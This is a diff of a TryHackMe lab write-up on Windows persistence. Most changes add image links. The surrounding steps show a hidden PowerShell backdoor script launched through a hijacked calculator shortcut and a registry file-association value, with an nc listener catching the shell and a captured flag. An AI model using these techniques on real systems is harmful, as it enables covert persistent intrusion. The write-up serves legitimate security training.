@@ -2,12 +2,17 @@
 1. Started up this room's machine
 2. Opened up the compromised Windows machine's calculator properties
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20New%20Properties.png)
 
 ![]()
 
 3. `PowerShell`
 ```PowerShell
+C:\Users\Administrator>PowerShell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator>
 ```
 4. `$scriptPath = 'C:\Windows\System32\<SCRIPT NAME>.ps1'`
 5. `$scriptContent = @"`
@@ -26,9 +31,9 @@ PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1
 ```
 5. Change the calculator's icon and shortcut properties to 'powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT NAME>.ps1'
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20Properties%20Zoomed%20In.png)
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20New%20Properties.png)
 
 6. `nc -lvnp <PORT NUMBER>`
 ```Bash
@@ -37,7 +42,7 @@ Listening on [0.0.0.0] (family 0, port 9999)
 ```
 7. Click on the calculator
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Backdoor%20Script%20Executed%20.png)
 
 ```Bash
 root@ip-10-10-210-65:~# nc -lnvp 9999
@@ -65,13 +70,15 @@ THM{NO_SHORTCUTS_IN_LIFE}
 C:\Users\Administrator>regedit
 ```
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit.png)
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt.png)
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20Zoomed%20In.png)
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20pt%202.png)
+
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20pt%202%20Zoomed%20In.png)
 
 3. `PowerShell`
 ```PowerShell
@@ -98,11 +105,11 @@ PS C:\Users\Administrator>
 ```
 10. Change value data to `powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT FILE>.ps1 %1`
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Default%20Value%20Data.png)
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/New%20Value%20Data.png)
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/New%20Value%20Data%20pt2.png)
 
 11. `nc -lvnp <PORT NUMBER>`
 ```Bash
